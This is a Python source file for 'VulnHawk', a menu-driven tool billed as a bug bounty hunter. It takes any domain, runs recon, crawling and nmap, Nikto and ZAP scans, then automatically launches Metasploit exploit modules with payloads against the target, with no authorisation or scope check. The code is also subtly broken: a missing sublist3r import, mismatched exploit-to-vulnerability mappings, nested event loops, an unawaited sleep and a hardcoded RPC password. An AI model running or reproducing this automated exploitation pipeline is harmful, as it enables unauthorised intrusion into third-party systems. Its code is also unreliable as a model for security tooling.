import os
import asyncio
import aiohttp
from aiohttp import ClientSession
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import subprocess
import time
import json
from metasploit.msfrpc import MsfRpcClient

# Colorful text utility
def color_text(text, color):
    colors = {
        'purple': '\033[95m',
        'green': '\033[92m',
        'red': '\033[91m',
        'yellow': '\033[93m',
        'end': '\033[0m'
    }
    return f"{colors[color]}{text}{colors['end']}"

# Main menu function
async def main_menu():
    while True:
        os.system('clear')
        print(color_text("VulnHawk", 'purple'))
        print(color_text("Your ultimate bug bounty hunting tool.", 'yellow'))
        print(color_text("Developed by [Your Name]", 'yellow'))
        print(color_text("1) Start Bug Bounty Hunting", 'purple'))
        print(color_text("2) About VulnHawk", 'purple'))
        print(color_text("3) About Developer", 'purple'))
        print(color_text("4) Exit", 'purple'))
        
        choice = input(color_text("Select an option: ", 'yellow'))
        
        if choice == '1':
            await bug_bounty_setup()
        elif choice == '2':
            about_vulnHawk()
        elif choice == '3':
            about_developer()
        elif choice == '4':
            exit_sequence()
            break
        else:
            print(color_text("Invalid option! Please try again.", 'red'))

async def bug_bounty_setup():
    while True:
        os.system('clear')
        print(color_text("VulnHawk", 'purple'))
        print(color_text("Bug Bounty Hacking Setup", 'yellow'))
        print(color_text("1) Start Hacking", 'purple'))
        print(color_text("2) Main Menu", 'purple'))
        
        choice = input(color_text("Select an option: ", 'yellow'))
        
        if choice == '1':
            await bug_bounty_hacking()
        elif choice == '2':
            await main_menu()
            break
        else:
            print(color_text("Invalid option! Please try again.", 'red'))

async def bug_bounty_hacking():
    os.system('clear')
    print(color_text("VulnHawk", 'purple'))
    target = input(color_text("Enter the target domain: ", 'yellow'))
    
    # Simulate loading sequence
    print(color_text("Loading and locking on target...", 'purple'))
    await asyncio.sleep(2)  # Simulate some processing time

    # Hacking phases
    try:
        await basic_recon(target)
        await crawling_and_scraping(target)
        await vulnerability_scanning(target)
        await exploitation_phase(target)
    except Exception as e:
        print(color_text(f"Error occurred: {e}", 'red'))

async def basic_recon(target):
    print(color_text("Starting Basic Recon...", 'green'))
    subdomains = await discover_subdomains(target)
    subdomains = await validate_subdomains(subdomains)
    with open(f'sub_domains_{target}.txt', 'w') as f:
        for sub in subdomains:
            f.write(f"{sub}\n")
    print(color_text("Basic Recon completed.", 'green'))

async def discover_subdomains(target):
    print(color_text(f"Discovering subdomains for {target}...", 'yellow'))
    try:
        loop = asyncio.get_event_loop()
        subdomains = await loop.run_in_executor(None, lambda: sublist3r.main(domain=target, ports=None, verbose=False, threads=10, enable_bruteforce=False, engines=None))
        print(color_text(f"Found {len(subdomains)} subdomains.", 'green'))
        return subdomains
    except Exception as e:
        print(color_text(f"Error discovering subdomains for {target}: {e}", 'red'))
        return []

async def validate_subdomains(subdomains):
    valid_subdomains = []
    async with ClientSession() as session:
        tasks = [validate_subdomain(session, sub) for sub in subdomains]
        results = await asyncio.gather(*tasks)
        valid_subdomains = [sub for sub, status in zip(subdomains, results) if status]
    return valid_subdomains

async def validate_subdomain(session, subdomain):
    try:
        async with session.get(f"http://{subdomain}", timeout=10) as response:
            if response.status == 200:
                print(color_text(f"Valid subdomain found: {subdomain}", 'green'))
                return True
            elif response.status == 301:
                # Handle redirects
                redirected_url = response.headers.get('Location')
                print(color_text(f"Redirected to {redirected_url}", 'yellow'))
                return await validate_subdomain(session, redirected_url)
    except Exception as e:
        print(color_text(f"Error validating subdomain {subdomain}: {e}", 'red'))
    return False

async def crawling_and_scraping(target):
    print(color_text("Starting Crawling & Scraping...", 'green'))
    base_url = f"http://{target}"
    urls_to_visit = {base_url}
    visited_urls = set()

    async def fetch(session, url):
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    return await response.text()
        except Exception as e:
            print(color_text(f"Error fetching {url}: {e}", 'red'))
        return None

    async def extract_urls(html, base_url):
        soup = BeautifulSoup(html, 'html.parser')
        urls = set()
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.startswith('/'):
                full_url = urljoin(base_url, href)
            elif href.startswith('http'):
                full_url = href
            else:
                full_url = urljoin(base_url, href)
            if base_url in full_url:
                urls.add(full_url)
        return urls

    async def crawl(url, session):
        if url in visited_urls:
            return
        visited_urls.add(url)
        html = await fetch(session, url)
        if html:
            new_urls = await extract_urls(html, base_url)
            urls_to_visit.update(new_urls)

    async with ClientSession() as session:
        while urls_to_visit:
            current_url = urls_to_visit.pop()
            await crawl(current_url, session)

    # Save the results to a file
    with open(f'{target}_website.txt', 'w') as f:
        for url in visited_urls:
            f.write(f"{url}\n")

    print(color_text(f"Crawling & Scraping completed. {len(visited_urls)} URLs found.", 'green'))

async def vulnerability_scanning(target):
    print(color_text("Starting Vulnerability Scanning & Detection...", 'green'))
    vulnerabilities = []

    try:
        # Nmap scanning
        nmap_result = await run_nmap_scan(target)
        vulnerabilities.extend(nmap_result)
        print(color_text("Nmap scan completed.", 'green'))
    except Exception as e:
        print(color_text(f"Error during Nmap scanning for {target}: {e}", 'red'))

    try:
        # Nikto scanning
        nikto_result = await run_nikto_scan(target)
        vulnerabilities.extend(nikto_result)
        print(color_text("Nikto scan completed.", 'green'))
    except Exception as e:
        print(color_text(f"Error during Nikto scanning for {target}: {e}", 'red'))

    try:
        # OWASP ZAP scanning
        zap_result = await run_zap_scan(target)
        vulnerabilities.extend(zap_result)
        print(color_text("OWASP ZAP scan completed.", 'green'))
    except Exception as e:
        print(color_text(f"Error during OWASP ZAP scanning for {target}: {e}", 'red'))

    # Save vulnerabilities to file
    try:
        with open(f'{target}_vulnerabilities.txt', 'w') as f:
            for vuln in vulnerabilities:
                f.write(f"{vuln}\n")
        print(color_text("Vulnerability Scanning & Detection completed.", 'green'))
    except Exception as e:
        print(color_text(f"Error saving vulnerabilities to file for {target}: {e}", 'red'))

async def run_nmap_scan(target):
    print(color_text("Running Nmap scan...", 'yellow'))
    try:
        result = subprocess.run(['nmap', '-sV', '--script=vuln', target], capture_output=True, text=True)
        output = result.stdout
        vulnerabilities = parse_nmap_output(output)
        return vulnerabilities
    except Exception as e:
        print(color_text(f"Error running Nmap scan: {e}", 'red'))
        return []

def parse_nmap_output(output):
    vulnerabilities = []
    current_service = None
    for line in output.split('\n'):
        if line.startswith('Nmap scan report for'):
            current_service = line
        if "VULNERABLE" in line:
            if current_service:
                vulnerabilities.append(f"{current_service}: {line}")
            else:
                vulnerabilities.append(line)
    return vulnerabilities

async def run_nikto_scan(target):
    print(color_text("Running Nikto scan...", 'yellow'))
    try:
        result = subprocess.run(['nikto', '-h', target], capture_output=True, text=True)
        output = result.stdout
        vulnerabilities = parse_nikto_output(output)
        return vulnerabilities
    except Exception as e:
        print(color_text(f"Error running Nikto scan: {e}", 'red'))
        return []

def parse_nikto_output(output):
    vulnerabilities = []
    for line in output.split('\n'):
        if "OSVDB" in line or "vulnerable" in line.lower():
            vulnerabilities.append(line)
    return vulnerabilities

async def run_zap_scan(target):
    print(color_text("Running OWASP ZAP scan...", 'yellow'))
    try:
        # Start ZAP in daemon mode
        zap_daemon = subprocess.Popen(['zap.sh', '-daemon', '-port', '8080', '-config', 'api.disablekey=true'], stdout=subprocess.PIPE)
        time.sleep(10)  # Give ZAP some time to start

        # Run the ZAP scan
        scan_command = ['zap-cli', 'quick-scan', '--self-contained', '-r', '-s', '-j', target]
        result = subprocess.run(scan_command, capture_output=True, text=True)
        
        if result.returncode != 0:
            raise Exception(f"ZAP scan failed: {result.stderr}")

        # Parse the ZAP JSON report
        vulnerabilities = parse_zap_output(result.stdout)
        return vulnerabilities
    except Exception as e:
        print(color_text(f"Error running ZAP scan: {e}", 'red'))
        return []
    finally:
        # Stop the ZAP daemon
        zap_daemon.terminate()
        zap_daemon.wait()

def parse_zap_output(output):
    vulnerabilities = []
    try:
        report = json.loads(output)
        for site in report['site']:
            for alert in site['alerts']:
                vulnerabilities.append(f"{alert['name']} - {alert['riskdesc']}: {alert['description']}")
    except json.JSONDecodeError as e:
        print(color_text(f"Error parsing ZAP output: {e}", 'red'))
    return vulnerabilities

async def exploitation_phase(target):
    print(color_text("Starting Exploitation Phase...", 'green'))
    try:
        vulnerabilities = parse_vulnerabilities(target)
        exploits = []

        with MsfRpcClient(password='msf') as client:
            for vulnerability in vulnerabilities:
                exploit = select_exploit(client, vulnerability)
                if exploit:
                    result = execute_exploit(client, exploit, target)
                    if result:
                        exploits.append(result)

        # Save exploits to file
        with open(f'{target}_exploit.txt', 'w') as f:
            for exploit in exploits:
                f.write(f"{exploit}\n")

        print(color_text("Exploitation Phase completed.", 'green'))
    except Exception as e:
        print(color_text(f"Error during exploitation phase for {target}: {e}", 'red'))

def parse_vulnerabilities(target):
    try:
        with open(f'{target}_vulnerabilities.txt', 'r') as f:
            vulnerabilities = f.readlines()
        return vulnerabilities
    except Exception as e:
        print(color_text(f"Error reading vulnerabilities file: {e}", 'red'))
        return []

def select_exploit(client, vulnerability):
    exploit = None
    if "SQL Injection" in vulnerability:
        exploit = 'exploit/unix/webapp/phpmyadmin_lfi_rce'
    elif "XSS" in vulnerability:
        exploit = 'exploit/multi/browser/firefox_xpi_bootstrapped_addon'
    # Add more mappings as needed
    return exploit

def execute_exploit(client, exploit, target):
    try:
        exploit_module = client.modules.use('exploit', exploit)
        exploit_module['RHOSTS'] = target
        if exploit_module.targetpayloads:
            payload = client.modules.use('payload', exploit_module.targetpayloads[0])
            exploit_module.execute(payload=payload)
            return f"Successfully executed {exploit} on {target}"
        else:
            return f"Exploit {exploit} has no valid payloads for {target}"
    except Exception as e:
        print(color_text(f"Error executing exploit {exploit} on {target}: {e}", 'red'))
        return None

def about_vulnHawk():
    os.system('clear')
    print(color_text("VulnHawk", 'purple'))
    print(color_text("VulnHawk is a comprehensive bug bounty hunting tool designed to streamline the process of discovering and exploiting vulnerabilities in web applications, domains, and crypto websites.", 'yellow'))
    input(color_text("Press 'Q' to go back to the main menu.", 'yellow'))
    asyncio.run(main_menu())

def about_developer():
    os.system('clear')
    print(color_text("Developer", 'purple'))
    print(color_text("Developed by Dr. Aubrey W. Love II (AKA Rogue Payload)", 'yellow'))
    print(color_text("Certifications: Ph.D. in Computer Science, Certified Ethical Hacker, Certified Website Developer", 'yellow'))
    print(color_text("Bio: Full-time chef/cook during the day, programmer & hacker at night. "
                     "Published astrophysicist, author, and ethical hacker. Dedicated to getting closer to God, "
                     "enjoying life, and achieving financial freedom.", 'yellow'))
    input(color_text("Press 'Q' to go back to the main menu.", 'yellow'))
    asyncio.run(main_menu())

def exit_sequence():
    os.system('clear')
    print(color_text("Shutting down VulnHawk...", 'red'))
    print(color_text("Goodbye!", 'yellow'))
    asyncio.sleep(2)

# Entry point
if __name__ == "__main__":
    asyncio.run(main_menu())
